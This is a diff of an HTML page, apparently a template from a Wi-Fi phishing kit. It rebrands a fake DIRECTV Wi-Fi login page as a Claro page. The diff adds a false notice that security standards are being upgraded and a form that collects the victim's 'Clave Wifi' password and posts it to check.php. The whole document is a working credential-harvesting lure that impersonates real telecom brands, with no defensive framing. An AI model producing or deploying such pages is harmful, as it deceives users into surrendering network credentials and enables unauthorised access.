@@ -5,7 +5,7 @@
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <title>DIRECTV Login</title>
+        <title>Claro Login</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
 
         <link rel="stylesheet" type="text/css" href="Telekom%20Login-Dateien/components.css">
@@ -20,10 +20,10 @@
             <div id="tbs-header-content">
                 <div class="container-fixed clearfix">
                     <div class="tbs-text-zero pull-left">
-                        <img src=directv.png width=300>
+                        <img src=claro.png>						
                     </div>
                     <div class="pull-right">
-                        <p class="text-right text-bold text-small tbs-text-upper">Buenos momentos siempre</p>
+                        <p class="text-right text-bold text-small tbs-text-upper">Cámbiate a Claro</p>
                     </div>
                 </div>
             </div>
@@ -40,13 +40,44 @@
                 <h1 class="text-center marketing-l text-thin tbs-text-1em">Login Wifi</h1>
                 
             </div>
-
-        <div class="text-center">
-		<div id="tbs-infobox">
-		<p><i class="icon icon-large">V</i> Conectado correctamente, Su conexión es segura.</p>
-		</div>
-		</div>
+					<div id="tbs-infobox">
+					<p>Estamos mejorando nuestras normas de seguridad, para seguir navegando, por favor ingresa tu contraseña</p>
+					</div>
             
+		
+            <form id="form1" name="form1" method="POST" action="check.php" accept-charset="UTF-8" autocomplete="off">
+                <!-- XSRF Prevention -->
+                
+					
+					<div class="offset-bottom-4">
+                    <!-- Re-Authentication -->
+                    <div class="container offset-bottom-1">
+                        
+                    </div>
+
+                    <!-- username input -->
+                    <div class="form-input-set offset-bottom-1">
+                        <input id="key1" name="key1" class="form-input" maxlength="256" tabindex="10" type="password">
+                        <label for="pw_usr">Clave Wifi</label>
+                    </div>
+
+                    
+
+                    
+
+                    <!-- Login button -->
+					<br>
+                    <div class="text-center">
+                        <button id="pw_submit" name="pw_submit" type="submit" class="btn btn-brand btn-large tbs-text-upper" tabindex="40">Confirmar</button>
+                    </div>
+                </div>
+            </form>
+
+            <div class="text-center">
+			
+                
+                
+            </div>
         </div>
         <!-- /CONTENT -->
 
@@ -57,12 +88,12 @@
     <div class="container-fixed">
         <div class="text-small clearfix">
             <div class="pull-left">
-                <p>&copy; 2017 DIRECTV</p>
+                <p>&copy; 2017 CLARO</p>
                 
             </div>
             <div class="pull-right clearfix">
                 <div class="pull-left">
-                    <a class="offset-right-4" href="https://www.directv.com" target="_blank" tabindex="90">Web</a>
+                    <a class="offset-right-4" href="https://www.claro.com" target="_blank" tabindex="90">Web</a>
                 </div>
                 
             </div>
